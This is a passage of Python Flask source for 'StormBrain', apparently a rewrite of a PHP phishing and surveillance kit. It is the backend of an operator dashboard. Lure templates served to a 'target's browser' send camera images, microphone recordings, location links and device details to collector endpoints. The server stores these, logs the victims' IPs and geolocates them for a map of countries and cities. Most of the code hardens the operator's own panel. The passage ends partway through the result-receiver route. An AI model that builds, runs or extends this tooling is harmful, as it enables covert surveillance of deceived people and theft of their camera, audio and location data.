"""
StormBrain - Flask Application
Replaces all PHP backend logic with Python/Flask

Security hardening (see TECHNICAL_REPORT_AZ.md, section 6):
 - Admin password lives as a salted hash in .secrets/credentials.json (gitignored).
 - Session cookie is HttpOnly + SameSite=Lax (Secure when STORM_SECURE_COOKIE=1).
 - Every state-changing admin request requires a CSRF token.
 - Harvested data (images, sounds, result.txt, settings, activity, visitors)
   is only reachable with an authenticated session.
 - Uploads/payloads are size limited and template names are validated.
 - IP geolocation uses HTTPS only and X-Forwarded-For is trusted only when
   STORM_TRUST_PROXY=1 (i.e. behind ngrok / a reverse proxy you control).
"""

import os
import re
import json
import base64
import hashlib
import hmac
import secrets
import shutil
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path

import requests
from flask import (
    Flask, render_template, request, redirect, url_for,
    session, jsonify, send_from_directory, make_response, abort
)
from werkzeug.security import check_password_hash, generate_password_hash
from werkzeug.utils import secure_filename

from modules import session_store

try:  # graceful degradation: the dashboard polls over HTTP when this is missing
    from flask_socketio import SocketIO, emit
    SOCKETIO_AVAILABLE = True
except ImportError:  # pragma: no cover - depends on the environment
    SocketIO = None
    emit = None
    SOCKETIO_AVAILABLE = False

# --- Configuration ---
BASE_DIR = Path(__file__).resolve().parent
STORM_WEB = BASE_DIR / "storm-web"
TEMPLATES_DIR = STORM_WEB / "templates"
IMAGES_DIR = STORM_WEB / "images"
SOUNDS_DIR = STORM_WEB / "sounds"
LOG_DIR = STORM_WEB / "log"
VISITORS_DIR = STORM_WEB / "visitors"
SESSIONS_DIR = STORM_WEB / "sessions"
# Secrets live outside the web root and are never served over HTTP.
SECRETS_DIR = BASE_DIR / ".secrets"
CREDENTIALS_FILE = SECRETS_DIR / "credentials.json"
SECRET_KEY_FILE = SECRETS_DIR / "secret.key"
SETTINGS_FILE = STORM_WEB / "Settings.json"
# Session token also lives OUTSIDE the web root. It used to sit in
# storm-web/check-c.json, i.e. inside the served directory tree - if the static
# folder ever widens, that token would become publicly downloadable.
CHECK_C_FILE = SECRETS_DIR / "check-c.json"
ACTIVITY_FILE = LOG_DIR / "activity.json"
EVENTS_FILE = LOG_DIR / "events.jsonl"
MAX_EVENT_MESSAGE = 4000
MAX_EVENTS_TAIL = 500


def _env_flag(name, default=False):
    """Read a boolean-ish environment variable."""
    value = os.environ.get(name)
    if value is None:
        return default
    return value.strip().lower() in ("1", "true", "yes", "on")


# Trust X-Forwarded-For only behind a proxy/tunnel you control (ngrok: STORM_TRUST_PROXY=1).
TRUST_PROXY = _env_flag("STORM_TRUST_PROXY", False)
# Enable only when the panel is reachable over HTTPS exclusively.
COOKIE_SECURE = _env_flag("STORM_SECURE_COOKIE", False)
MAX_UPLOAD_BYTES = int(os.environ.get("STORM_MAX_UPLOAD_MB", "16")) * 1024 * 1024
MAX_RESULT_BYTES = 256 * 1024
TEMPLATE_NAME_RE = re.compile(r"^[A-Za-z0-9_-]{1,32}$")
CSRF_SESSION_KEY = "csrf_token"
CSRF_HEADER = "X-CSRF-Token"
CSRF_FORM_FIELD = "csrf_token"
# Endpoints called by the target's browser: it cannot hold our CSRF token by design.
CSRF_EXEMPT_ENDPOINTS = {
    "template_handler", "template_error", "template_post", "camera_post", "microphone_upload",
}

# Ensure runtime directories exist
for _directory in (SECRETS_DIR, IMAGES_DIR, SOUNDS_DIR, LOG_DIR, VISITORS_DIR, SESSIONS_DIR):
    _directory.mkdir(parents=True, exist_ok=True)


def _load_secret_key():
    """Keep the Flask session key stable across restarts (env > file > generated)."""
    env_key = os.environ.get("SECRET_KEY")
    if env_key:
        return env_key
    try:
        stored = SECRET_KEY_FILE.read_text(encoding="utf-8").strip()
        if stored:
            return stored
    except FileNotFoundError:
        pass
    generated = secrets.token_hex(32)
    SECRET_KEY_FILE.write_text(generated, encoding="utf-8")
    try:
        os.chmod(SECRET_KEY_FILE, 0o600)
    except OSError:
        pass
    return generated


app = Flask(
    __name__,
    template_folder=str(STORM_WEB),
    static_folder=str(STORM_WEB / "assets"),
    static_url_path="/assets"
)
app.secret_key = _load_secret_key()
app.config.update(
    MAX_CONTENT_LENGTH=MAX_UPLOAD_BYTES,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
    SESSION_COOKIE_SECURE=COOKIE_SECURE,
)
# Same-origin only: the panel is served by this app, so no wildcard CORS.
socketio = SocketIO(app) if SOCKETIO_AVAILABLE else None


# ──────────────────────────────────────────────
# Helper functions (replaces login-arc.php)
# ──────────────────────────────────────────────

def generate_token():
    """Generate a unique token (replaces PHP generate_token)."""
    uniqid = hashlib.md5(uuid.uuid4().hex.encode()).hexdigest()
    parts = [uniqid[i:i+5] for i in range(0, len(uniqid), 5)]
    return "-".join(parts)


def read_check_c():
    """Read check-c.json token data."""
    try:
        with open(CHECK_C_FILE, "r") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {"token": "", "expired": "no"}


def write_check_c(data):
    """Write check-c.json token data (0600 - it is an auth credential)."""
    with open(CHECK_C_FILE, "w") as f:
        json.dump(data, f)
    try:
        os.chmod(CHECK_C_FILE, 0o600)
    except OSError:
        pass


def _migrate_legacy_check_c():
    """One-time move of the old storm-web/check-c.json into .secrets/.

    Older builds kept the session token inside the served web root. Move it
    (never copy) so the token is no longer reachable from that directory, then
    leave a harmless empty stub so old tooling does not crash.
    """
    legacy = STORM_WEB / "check-c.json"
    if not legacy.exists() or CHECK_C_FILE.exists():
        return
    try:
        data = json.loads(legacy.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return
    if not isinstance(data, dict) or not data.get("token"):
        return
    write_check_c(data)
    try:
        legacy.unlink()
    except OSError:
        pass


def change_token(token):
    """Update the stored token (replaces PHP change_token)."""
    data = read_check_c()
    data["token"] = token
    data["expired"] = "no"
    write_check_c(data)


# Move a legacy in-web-root session token into .secrets/ on startup.
_migrate_legacy_check_c()


# ──────────────────────────────────────────────
# Credentials (hashed + persisted, never inside the web root)
# ──────────────────────────────────────────────

_credentials_lock = threading.RLock()
ENV_ADMIN_USER = os.environ.get("STORM_ADMIN_USER")
ENV_ADMIN_PASSWORD = os.environ.get("STORM_ADMIN_PASSWORD")


def _read_credentials_file():
    try:
        with open(CREDENTIALS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return None
    if isinstance(data, dict) and data.get("password_hash"):
        return data
    return None


def _write_credentials_file(data):
    with _credentials_lock:
        tmp_file = CREDENTIALS_FILE.with_suffix(".tmp")
        tmp_file.write_text(json.dumps(data, indent=2), encoding="utf-8")
        tmp_file.replace(CREDENTIALS_FILE)
    try:
        os.chmod(CREDENTIALS_FILE, 0o600)
    except OSError:
        pass


def load_credentials():
    """Return the admin credentials, bootstrapping a hashed default on first run."""
    stored = _read_credentials_file()
    if stored:
        return stored

    with _credentials_lock:
        stored = _read_credentials_file()
        if stored:
            return stored
        stored = {
            "username": ENV_ADMIN_USER or "admin",
            "fullname": "hacker",
            "password_hash": generate_password_hash(ENV_ADMIN_PASSWORD or "admin"),
            "updated": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        _write_credentials_file(stored)

    print(f" [!] Admin credentials created at {CREDENTIALS_FILE}")
    if not ENV_ADMIN_PASSWORD:
        print(" [!] Default password is 'admin' - change it in the dashboard Settings tab!")
    return stored


def verify_credentials(username, password):
    """Constant-time credential check (env override wins, otherwise the hash file)."""
    if not username or not password:
        return False
    if ENV_ADMIN_USER and ENV_ADMIN_PASSWORD:
        return (
            hmac.compare_digest(username.encode(), ENV_ADMIN_USER.encode())
            and hmac.compare_digest(password.encode(), ENV_ADMIN_PASSWORD.encode())
        )
    stored = load_credentials()
    if not hmac.compare_digest(username.encode(), str(stored.get("username", "")).encode()):
        return False
    return check_password_hash(stored.get("password_hash", ""), password)


def set_admin_password(new_password):
    """Persist a new password hash so it survives a restart."""
    stored = load_credentials()
    stored["password_hash"] = generate_password_hash(new_password)
    stored["updated"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    _write_credentials_file(stored)


# ──────────────────────────────────────────────
# CSRF protection
# ──────────────────────────────────────────────

def ensure_csrf_token():
    """Create (once per session) and return the CSRF token."""
    token = session.get(CSRF_SESSION_KEY)
    if not token:
        token = secrets.token_urlsafe(32)
        session[CSRF_SESSION_KEY] = token
    return token


def csrf_token_is_valid():
    """Validate the CSRF token from header, form field or JSON body."""
    expected = session.get(CSRF_SESSION_KEY, "")
    if not expected:
        return False
    supplied = request.headers.get(CSRF_HEADER) or request.form.get(CSRF_FORM_FIELD, "")
    if not supplied:
        payload = request.get_json(silent=True)
        if isinstance(payload, dict):
            supplied = payload.get(CSRF_FORM_FIELD) or payload.get("_csrf") or ""
    return hmac.compare_digest(str(supplied).encode(), expected.encode())


@app.before_request
def _enforce_csrf():
    """Reject state-changing requests without a valid CSRF token."""
    if request.method in ("GET", "HEAD", "OPTIONS"):
        return None
    if request.endpoint is None or request.endpoint in CSRF_EXEMPT_ENDPOINTS:
        return None
    if not csrf_token_is_valid():
        return jsonify({"error": "invalid or missing CSRF token"}), 403
    return None


@app.after_request
def _security_headers(response):
    """Baseline hardening headers for every response.

    CSP is deliberately NOT set here: panel.html loads Bootstrap/chart.js from
    a CDN and uses inline <script>/onclick=, so a strict policy would break the
    console. Tracked as a follow-up in the security audit.
    """
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("X-Frame-Options", "DENY")
    response.headers.setdefault("Referrer-Policy", "no-referrer")
    response.headers.setdefault("X-XSS-Protection", "1; mode=block")
    response.headers.setdefault("Cross-Origin-Opener-Policy", "same-origin")
    # Do not advertise the server stack.
    response.headers["X-Powered-By"] = ""
    # Only advertise HSTS when the panel is actually served over TLS.
    if COOKIE_SECURE or request.is_secure:
        response.headers.setdefault(
            "Strict-Transport-Security", "max-age=31536000; includeSubDomains"
        )
    # API/collector responses are JSON and must never be cached by proxies.
    if request.path.startswith(("/api/", "/receiver", "/templates/")):
        response.headers.setdefault("Cache-Control", "no-store, private")
    return response


# ──────────────────────────────────────────────
# Rate limiting (dependency free, per client IP)
# ──────────────────────────────────────────────

class RateLimiter:
    """Sliding-window limiter: at most N requests per window per key."""

    def __init__(self, max_requests, window_seconds):
        self.max_requests = max_requests
        self.window_seconds = window_seconds
        self._hits = {}
        self._lock = threading.Lock()

    def allow(self, key):
        now = time.monotonic()
        cutoff = now - self.window_seconds
        with self._lock:
            hits = [stamp for stamp in self._hits.get(key, []) if stamp > cutoff]
            if len(hits) >= self.max_requests:
                self._hits[key] = hits
                return False
            hits.append(now)
            self._hits[key] = hits
            if len(self._hits) > 2000:  # keep memory bounded
                self._hits = {k: v for k, v in self._hits.items() if v and v[-1] > cutoff}
            return True


LOGIN_LIMITER = RateLimiter(int(os.environ.get("STORM_LOGIN_RATE", "10")), 60)
COLLECT_LIMITER = RateLimiter(int(os.environ.get("STORM_COLLECT_RATE", "120")), 60)
API_LIMITER = RateLimiter(int(os.environ.get("STORM_API_RATE", "240")), 60)
# Per-username throttle: an attacker rotating IPs cannot brute-force one
# account indefinitely. Deliberately looser than the per-IP login limit.
AUTH_USER_LIMITER = RateLimiter(int(os.environ.get("STORM_LOGIN_USER_RATE", "20")), 300)


def _auth_user_throttled(username):
    """True when this account has exceeded the username-based attempt limit.

    Counts every attempt (success or failure) for the account, so an attacker
    rotating source IPs cannot brute-force a single account indefinitely.
    """
    name = str(username or "").strip().lower()
    if not name:
        return False
    return not AUTH_USER_LIMITER.allow(f"auth-user:{name}")


def rate_limit(limiter, bucket):
    """Return a 429 response when the caller exceeded the limiter, else None."""
    key = f"{bucket}:{get_client_ip()}"
    if limiter.allow(key):
        return None
    retry_after = limiter.window_seconds
    response = jsonify({
        "error": "rate limit exceeded",
        "retry_after": retry_after,
        "message": f"Too many requests. Try again in {retry_after} seconds.",
    })
    response.status_code = 429
    # Tell the client exactly how long to wait (prompt: actionable error).
    response.headers["Retry-After"] = str(retry_after)
    return response


# ──────────────────────────────────────────────
# Template / payload validation
# ──────────────────────────────────────────────

def safe_template_dir(template_name, must_exist=True):
    """Validate a template name and return its directory inside TEMPLATES_DIR."""
    if not TEMPLATE_NAME_RE.match(template_name or ""):
        abort(400)
    base = TEMPLATES_DIR.resolve()
    directory = (base / template_name).resolve()
    if directory.parent != base:
        abort(400)
    if must_exist and not directory.is_dir():
        abort(404)
    return directory


def write_result_file(directory, content):
    """Atomically write result.txt for a template (size limited).

    result.txt is the per-template *inbox*: the newest payload. The forensic
    history lives in storm-web/log/events.jsonl (append-only) and is never
    cleared by reads.
    """
    if len(content.encode("utf-8", errors="ignore")) > MAX_RESULT_BYTES:
        abort(413)
    tmp_file = directory / "result.tmp.txt"
    tmp_file.write_text(content, encoding="utf-8")
    tmp_file.replace(directory / "result.txt")


# ──────────────────────────────────────────────
# Forensic event log (append-only JSONL, never wiped by reads)
# ──────────────────────────────────────────────

_events_lock = threading.Lock()
_EVENT_TYPES = ("image", "audio", "location", "info", "error")


def _hash_ip(ip):
    """Stable short hash of a visitor IP (chain-of-custody without raw PII)."""
    if not ip or ip == "unknown":
        return ""
    digest = hashlib.sha256(f"{ip}|storm-events".encode()).hexdigest()
    return digest[:12]


def _utc_now_iso():
    return datetime.now().strftime("%Y-%m-%dT%H:%M:%S")


def append_event(template, event_type, message, **fields):
    """Append one typed event line to storm-web/log/events.jsonl.

    Envelope: {ts, template, ip_hash, type, message, file?, lat?, lon?}.
    ``template``/``type`` are allow-listed, message is truncated, optional
    ``file``/``lat``/``lon`` are validated. Never raises (collectors run on
    the victim path and must not 500 the lure).
    """
    template = str(template or "unknown")[:32]
    if not TEMPLATE_NAME_RE.match(template):
        template = "unknown"
    event_type = str(event_type or "info")
    if event_type not in _EVENT_TYPES:
        event_type = "info"
    message = str(message or "")[:MAX_EVENT_MESSAGE]

    event = {
        "ts": _utc_now_iso(),
        "template": template,
        "ip_hash": _hash_ip(get_client_ip()),
        "type": event_type,
        "message": message,
    }
    filename = fields.get("file")
    if filename:
        event["file"] = Path(str(filename)).name[:128]
    lat = fields.get("lat")
    lon = fields.get("lon")
    if isinstance(lat, (int, float)) and isinstance(lon, (int, float)):
        if -90.0 <= lat <= 90.0 and -180.0 <= lon <= 180.0:
            event["lat"] = lat
            event["lon"] = lon

    line = json.dumps(event, ensure_ascii=False)
    with _events_lock:
        try:
            LOG_DIR.mkdir(parents=True, exist_ok=True)
            with open(EVENTS_FILE, "a", encoding="utf-8") as f:
                f.write(line + "\n")
        except OSError as exc:
            print(f"Error appending event log: {exc}")
    return event


def _classify_collector_text(text):
    """Server-side typing so the panel never sniffs message wording."""
    lowered = (text or "").lower()
    if "audio file was saved" in lowered or lowered.startswith("audio"):
        return "audio"
    if "image file was saved" in lowered:
        return "image"
    if "google map link" in lowered or "google.com/maps" in lowered:
        return "location"
    if "denied" in lowered or "not supported" in lowered or "could not" in lowered:
        return "error"
    return "info"


def log_collector_event(template, message, event_type=None, **fields):
    """Typed forensic log for every result.txt write (one call per inbox)."""
    message = str(message or "")
    resolved = event_type or _classify_collector_text(message)
    if message.strip().startswith("Google Map Link"):
        resolved = "location"
    return append_event(template, resolved, message, **fields)


def read_events_tail(limit=100):
    """Return the last ``limit`` events (oldest→newest), tolerant of junk."""
    try:
        limit = int(limit)
    except (TypeError, ValueError):
        limit = 100
    limit = max(1, min(limit, MAX_EVENTS_TAIL))
    try:
        with open(EVENTS_FILE, "r", encoding="utf-8") as f:
            lines = f.readlines()
    except (FileNotFoundError, OSError):
        return []
    events = []
    for line in lines[-limit:]:
        line = line.strip()
        if not line:
            continue
        try:
            parsed = json.loads(line)
        except ValueError:
            continue
        if isinstance(parsed, dict):
            events.append(parsed)
    return events


def _load_visitors():
    """Read visitors.json (empty list when missing or corrupt)."""
    try:
        with open(VISITORS_DIR / "visitors.json", "r", encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return []


def _count_media(directory, suffixes):
    """Count files with the given suffixes inside a directory."""
    if not directory.exists():
        return 0
    return len([f for f in directory.iterdir() if f.is_file() and f.suffix.lower() in suffixes])


# ──────────────────────────────────────────────
# Activity log (persisted so it survives restarts)
# ──────────────────────────────────────────────

_activity_lock = threading.Lock()


def _load_activity_log():
    try:
        with open(ACTIVITY_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        return data if isinstance(data, list) else []
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        return []


def save_activity_log():
    try:
        tmp_file = ACTIVITY_FILE.with_suffix(".tmp")
        tmp_file.write_text(json.dumps(activity_log[-200:], indent=2), encoding="utf-8")
        tmp_file.replace(ACTIVITY_FILE)
    except OSError as exc:
        print(f"Error saving activity log: {exc}")


def add_activity(entry):
    """Append an activity entry, keeping only the last 200 and persisting them."""
    with _activity_lock:
        activity_log.append(entry)
        del activity_log[:-200]
        save_activity_log()


def is_logged_in():
    """Check if the user is authenticated.

    The session cookie is the primary proof. The 'logindata' cookie is a
    legacy PHP fallback; it is compared in constant time so the token cannot
    be recovered byte-by-byte through response timing.
    """
    if session.get("IAm-logined"):
        return True
    # Legacy cookie fallback (replaces the PHP check-c.json mechanism).
    key = read_check_c()
    expected = str(key.get("token") or "")
    login_cookie = request.cookies.get("logindata", "")
    if expected and login_cookie and key.get("expired") == "no":
        if hmac.compare_digest(login_cookie.encode(), expected.encode()):
            # Store the real username (never "yes") so password changes keep working.
            session["IAm-logined"] = load_credentials().get("username", "admin")
            return True
    return False


def get_client_ip():
    """Client IP; X-Forwarded-For is honoured only behind a trusted proxy/tunnel."""
    if TRUST_PROXY:
        forwarded = request.headers.get("X-Forwarded-For")
        if forwarded:
            return forwarded.split(",")[0].strip()
    return request.remote_addr or "unknown"


GEO_CACHE = {}
GEO_CACHE_LOCK = threading.Lock()
GEO_CACHE_TTL = int(os.environ.get("STORM_GEO_CACHE_TTL", "3600"))
GEO_CACHE_MAX = 500


def _empty_geo(ip):
    return {
        "ip": ip,
        "city": "Unknown",
        "country": "Unknown",
        "region": "Unknown",
        "lat": 0,
        "lon": 0,
        "isp": "Unknown",
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }


def _is_private_ip(ip):
    """Skip geolocation lookups for loopback and RFC1918/link-local addresses."""
    if not ip or ip == "unknown":
        return True
    if ip in ("127.0.0.1", "::1"):
        return True
    return ip.startswith((
        "10.", "192.168.", "169.254.",
        "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.",
        "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.",
        "fc", "fd", "fe80",
    ))


def get_ip_geolocation(ip):
    """Geolocate an IP over HTTPS (ipwho.is). Cached; never plaintext HTTP."""
    if _is_private_ip(ip):
        return _empty_geo(ip)

    now = time.monotonic()
    with GEO_CACHE_LOCK:
        cached = GEO_CACHE.get(ip)
        if cached and now - cached[0] < GEO_CACHE_TTL:
            return dict(cached[1])

    try:
        response = requests.get(f"https://ipwho.is/{ip}", timeout=3)
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                geo = {
                    "ip": ip,
                    "city": data.get("city") or "Unknown",
                    "country": data.get("country") or "Unknown",
                    "region": data.get("region") or "Unknown",
                    "lat": data.get("latitude") or 0,
                    "lon": data.get("longitude") or 0,
                    "isp": (data.get("connection") or {}).get("isp") or "Unknown",
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                with GEO_CACHE_LOCK:
                    if len(GEO_CACHE) >= GEO_CACHE_MAX:
                        GEO_CACHE.clear()
                    GEO_CACHE[ip] = (now, geo)
                return dict(geo)
    except Exception as e:
        print(f"Error getting IP geolocation: {e}")

    return _empty_geo(ip)


def save_visitor_info(ip, template_name):
    """Save visitor information (capped at 100 entries) atomically."""
    geo_data = get_ip_geolocation(ip)
    geo_data["template"] = template_name
    visitors_file = VISITORS_DIR / "visitors.json"

    try:
        visitors = _load_visitors()
        visitors.append(geo_data)
        del visitors[:-100]
        tmp_file = visitors_file.with_suffix(".tmp")
        tmp_file.write_text(json.dumps(visitors, indent=2), encoding="utf-8")
        tmp_file.replace(visitors_file)
    except OSError as e:
        print(f"Error saving visitor info: {e}")


# ──────────────────────────────────────────────
# Geo intel derived from the LOGS (IP -> country / city)
# ──────────────────────────────────────────────

IP_LABELED_RE = re.compile(r"(?i)\bip\s*[:=]\s*((?:(?:25[0-5]|2[0-4][0-9]|1?[0-9]?[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1?[0-9]?[0-9]))")
IPV4_RE = re.compile(r"\b(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}"
                     r"(?:25[0-5]|2[0-4]\d|1?\d?\d)\b")
VERSION_LIKE_RE = re.compile(r"^(?:154\.0\.0\.0|0\.0\.0\.0|255\.255\.255\.255|1\.0\.0\.1)$")  # browser versions, never a visitor IP
MAX_GEO_PLACES = 60          # payload bound for the map
MAX_NEW_LOOKUPS = 12         # uncached ipwho.is calls per request (bounded latency)


def _read_log_sources():
    """Gather raw IP sightings from every place the victims write log data.

    Sources: templates/*/result.txt (device-info lines such as ``ip : 1.2.3.4``)
    and storm-web/log/events.jsonl (typed forensic events). Returns
    ``{ip: {"count": n, "sources": set, "last": ts}}``. Private IPs are skipped.
    """
    found = {}

    def add(ip, source, ts=""):
        if not ip or _is_private_ip(ip):
            return
        entry = found.setdefault(ip, {"count": 0, "sources": set(), "last": ""})
        entry["count"] += 1
        entry["sources"].add(source)
        if ts and ts > entry["last"]:
            entry["last"] = ts

    def extract_ips(text):
        s = str(text or "")
        lab = IP_LABELED_RE.findall(s)  # "ip : 1.2.3.4" wins over version numbers
        if lab:
            return lab
        return [ip for ip in IPV4_RE.findall(s) if not VERSION_LIKE_RE.match(ip)]

    # 1) per-template inbox files (may hold multi-line device reports)
    if TEMPLATES_DIR.exists():
        for template_dir in sorted(TEMPLATES_DIR.iterdir()):
            if not template_dir.is_dir():
                continue
            for name in ("result.txt", "result.tmp.txt"):
                path = template_dir / name
                if not path.is_file():
                    continue
                try:
                    text = path.read_text(encoding="utf-8", errors="ignore")
                except OSError:
                    continue
                for ip in extract_ips(text):
                    add(ip, template_dir.name)

    # 2) the append-only forensic event log (never wiped by reads)
    for event in read_events_tail(MAX_EVENTS_TAIL):
        ts = str(event.get("ts") or "")
        source = str(event.get("template") or "event")
        for ip in extract_ips(str(event.get("message") or "")):
            add(ip, source, ts)

    return found


def geo_intel_from_logs():
    """Resolve every IP seen in the logs to {country, city, lat, lon, isp}.

    Priority: already-geolocated visitors (free) > cached geo > fresh lookups
    (bounded to MAX_NEW_LOOKUPS per call so the request stays fast).
    """
    places = {}
    new_lookups = []

    def remember(ip, geo, sources, last, kind, count=1):
        if not ip:
            return
        entry = {
            "ip": ip,
            "country": str(geo.get("country") or "Unknown"),
            "city": str(geo.get("city") or "Unknown"),
            "region": str(geo.get("region") or "Unknown"),
            "isp": str(geo.get("isp") or "Unknown"),
            "lat": geo.get("lat") or None,
            "lon": geo.get("lon") or None,
            "kind": kind,
            "count": count,
            "last_seen": last or str(geo.get("timestamp") or ""),
            "sources": sorted(set(sources)),
        }
        current = places.get(ip)
        if current is None:
            places[ip] = entry
            return
        current["count"] += count
        for src in entry["sources"]:
            if src not in current["sources"]:
                current["sources"].append(src)
        if (entry["last_seen"] or "") > (current["last_seen"] or ""):
            current["last_seen"] = entry["last_seen"]
        # Prefer a known city/country and real coordinates over blanks.
        if current["city"] in ("", "Unknown") and entry["city"] != "Unknown":
            for key in ("city", "country", "region", "isp", "lat", "lon"):
                if entry.get(key) not in (None, "", "Unknown"):
                    current[key] = entry[key]

    # 1) visitors are already geolocated (no network cost)
    seen_in_visitors = set()
    for visitor in _load_visitors():
        ip = visitor.get("ip")
        if not ip or visitor.get("lat") is None:
            continue
        remember(ip, visitor, {visitor.get("template") or "visitor"},
                 visitor.get("timestamp", ""), "ip")
        seen_in_visitors.add(ip)

    # 2) IPs found in the logs: cached lookups are free, the rest are queued
    sightings = _read_log_sources()
    for ip, info in sightings.items():
        if ip in seen_in_visitors:
            if ip in places:
                places[ip]["count"] += info["count"]
            continue
        now = time.monotonic()
        with GEO_CACHE_LOCK:
            cached = GEO_CACHE.get(ip)
            fresh = cached and now - cached[0] < GEO_CACHE_TTL
        if fresh:
            remember(ip, dict(cached[1]), info["sources"], info["last"], "ip", info["count"])
        else:
            new_lookups.append((ip, info))

    # Resolve a bounded slice in parallel so a cold cache still answers fast.
    new_lookups.sort(key=lambda item: -item[1]["count"])
    to_resolve = new_lookups[:MAX_NEW_LOOKUPS]
    if to_resolve:
        try:
            from concurrent.futures import ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=6) as pool:
                results = list(pool.map(
                    lambda item: get_ip_geolocation(item[0]), to_resolve
                ))
        except Exception as exc:  # pragma: no cover - defensive
            print(f"Geo intel lookup failed: {exc}")
            results = [_empty_geo(ip) for ip, _ in to_resolve]
        for (ip, info), geo in zip(to_resolve, results):
            remember(ip, geo, info["sources"], info["last"], "ip", info["count"])

    ordered = sorted(places.values(), key=lambda p: -p["count"])[:MAX_GEO_PLACES]

    country_hits, city_hits, unresolved = {}, {}, []
    for place in ordered:
        country = place["country"]
        if country and country != "Unknown":
            country_hits[country] = country_hits.get(country, 0) + 1
        if place["city"] and place["city"] != "Unknown":
            key = (place["city"], country)
            bucket = city_hits.setdefault(
                key, {"count": 0, "lat": place["lat"], "lon": place["lon"]}
            )
            bucket["count"] += 1
            if bucket["lat"] is None:
                bucket["lat"] = place["lat"]
                bucket["lon"] = place["lon"]
        elif place["kind"] == "ip":
            unresolved.append(place["ip"])

    return {
        "generated": datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
        "places": ordered,
        "ips_seen_in_logs": len(sightings),
        "resolved": len([p for p in ordered if p["country"] != "Unknown"]),
        "unresolved": unresolved[:20],
        "countries": [
            {"name": name, "count": count}
            for name, count in sorted(country_hits.items(), key=lambda item: -item[1])
        ],
        "cities": [
            {"name": city, "country": country, "count": info["count"],
             "lat": info["lat"], "lon": info["lon"]}
            for (city, country), info in sorted(
                city_hits.items(), key=lambda item: -item[1]["count"]
            )
        ],
    }


# ──────────────────────────────────────────────
# Routes replacing PHP files
# ──────────────────────────────────────────────

# --- index.php → / ---
@app.route("/")
def index():
    if is_logged_in():
        return redirect(url_for("panel"))
    return redirect(url_for("login"))


# --- login.php → /login ---
@app.route("/login", methods=["GET", "POST"])
def login():
    if is_logged_in():
        return redirect(url_for("panel"))

    error = None
    if request.method == "POST":
        limited = rate_limit(LOGIN_LIMITER, "login")
        if limited:
            return limited

        username = request.form.get("username", "")
        password = request.form.get("password", "")

        # Account-based throttle: stops IP rotation from brute-forcing one
        # account. Checked after the IP limit so both layers apply.
        if _auth_user_throttled(username):
            retry = AUTH_USER_LIMITER.window_seconds
            response = jsonify({
                "error": "account temporarily locked",
                "retry_after": retry,
                "message": f"Too many attempts for this account. Try again in {retry} seconds.",
            })
            response.status_code = 429
            response.headers["Retry-After"] = str(retry)
            return response

        if verify_credentials(username, password):
            session.clear()
            session["IAm-logined"] = username
            # Set cookie
            client_token = generate_token()
            change_token(client_token)
            response = make_response(redirect(url_for("panel")))
            response.set_cookie(
                "logindata", client_token,
                max_age=86400 * 30, httponly=True, samesite="Lax", secure=COOKIE_SECURE
            )
            return response
        else:
            error = "Username or password is incorrect!"

    return render_template("login.html", error=error, csrf_token=ensure_csrf_token())


# --- panel.php → /panel ---
@app.route("/panel")
def panel():
    if not is_logged_in():
        return redirect(url_for("login"))

    csrf_token = ensure_csrf_token()

    # Ensure cookie token is set. Rotate only when the cookie is genuinely
    # missing/mismatched - the previous unconditional rotation logged every
    # other device out of the panel on each page load.
    key = read_check_c()
    login_cookie = request.cookies.get("logindata", "")
    expected = str(key.get("token") or "")
    needs_token = not login_cookie or not expected or not hmac.compare_digest(
        login_cookie.encode(), expected.encode()
    )
    if needs_token:
        client_token = generate_token()
        change_token(client_token)
        response = make_response(render_template("panel.html", csrf_token=csrf_token))
        response.set_cookie(
            "logindata", client_token,
            max_age=86400 * 30, httponly=True, samesite="Lax", secure=COOKIE_SECURE
        )
        return response

    return render_template("panel.html", csrf_token=csrf_token)


# --- logout ---
@app.route("/logout")
def logout():
    """Log out: drop the session AND invalidate the server-side token.

    Without the change_token() call the old 'logindata' cookie would still
    match check-c.json, so is_logged_in() would keep accepting it and the
    logout would be a no-op for anyone holding the cookie.
    """
    session.clear()
    change_token("")  # revoke: no cookie value can authenticate any more
    resp = make_response(redirect(url_for("login")))
    resp.delete_cookie("logindata")
    return resp


# --- receiver.php → /receiver ---
# Non-destructive inbox drain: result.txt files are read WITHOUT being
# cleared (history lives in storm-web/log/events.jsonl, written at collect
# time). Response shape is backwards compatible: plain-text lines for the
# legacy dashboard poller, plus typed per-template entries in X-Events JSON.
@app.route("/receiver", methods=["POST"])
def receiver():
    """Collect results from all template result.txt files without clearing them."""
    if not is_logged_in():
        return jsonify({"error": "unauthorized"}), 401
    limited = rate_limit(API_LIMITER, "receiver")
    if limited:
        return limited
    if "send_me_result" not in request.form:
        return "", 204

    results = []
    typed = []
    if TEMPLATES_DIR.exists():
        for template_dir in sorted(TEMPLATES_DIR.iterdir()):
            if template_dir.is_dir():
                result_file = template_dir / "result.txt"
                if result_file.exists():
                    try:
                        mtime = datetime.fromtimestamp(
                            result_file.stat().st_mtime
                        ).strftime("%Y-%m-%dT%H:%M:%S")
                    except OSError:
                        mtime = _utc_now_iso()
                    data = result_file.read_text(encoding="utf-8", errors="ignore").strip()
                    if data:
                        results.append(data)
                        # Drained inbox entries keep their server-side type so the
                        # panel never has to sniff message wording.
